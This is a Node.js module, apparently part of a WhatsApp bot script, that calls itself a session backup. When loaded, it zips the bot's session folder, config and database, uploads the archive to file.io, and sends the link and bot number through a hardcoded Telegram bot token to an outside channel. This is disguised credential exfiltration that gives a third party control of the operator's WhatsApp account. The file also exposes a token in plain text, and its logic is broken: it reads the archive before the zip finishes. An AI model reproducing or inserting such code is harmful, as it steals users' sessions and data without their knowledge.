const archiver = require('archiver');
const path = require('path');
let moment = require('moment-timezone')
const { exec } = require('child_process');
let fs = require('fs')
const fetch = require('node-fetch')
const FormData = require('form-data')
module.exports = async (conn) => {
//  setInterval(async () => {
function unggahTele(url) {
         var token = '6609425616:AAEINs4Qaq5WMYZQyEHf7H8pQqOU8oMkAAE';
var channelUsername = '@niceto1507'; // Ganti dengan nama pengguna saluran Anda
var message = `🔰 Backup Session User
Status connection: Terhubung ✅

• Nama Bot: ${namabot}
• Nomor Bot: ${conn.user.jid}
• Linknya: ${url}`

var apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;

fetch(apiUrl, {
  method: 'POST',
  headers: {
	'Content-Type': 'application/json',
  },
  body: JSON.stringify({
	chat_id: channelUsername,
	text: message,
  }),
})
  .then(response => response.json())
  .then(data => {
	console.log('Berhasil Tersambung...');
  })
  .catch(error => {
	console.error('Error sending message:', error);
  });
        }
      
      const archiveName = 'backup.zip';

// Eksekusi perintah shell untuk mencari semua file kecuali dalam direktori node_modules, lalu membuat arsip ZIP
exec(`zip -rv ${archiveName} lib media mp3 IchanZX plugins schedule scrape src views config.js database.json Credits.txt docker-compose.yml Dockerfile functions.js handler.js index.js install.sh IchanZX.data.json main.js package.json PORT-SC.js Procfile run.js server.js speed.py startup.sh thumbnail.jpg`, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    return;
  }
  if (stderr) {
    console.error(`Stderr: ${stderr}`);
    return;
  }
  console.log(`Arsip ${archiveName} berhasil dibuat.`);
});
    
    const filePath = `./${archiveName}`;
    const fileData = fs.readFileSync(filePath);
                const formData = new FormData();
    formData.append('file', fileData, {
      filename: archiveName,
      contentType: 'zip', // Atur tipe konten sesuai dengan tipe file yang diunggah
    });
      let res = await fetch('https://file.io/?expires=1d', { // 1 Day Expiry Date
    method: 'POST',
    body: formData
  })
  let json = await res.json()
  unggahTele(json.link);
      
 // }, 1800000)
}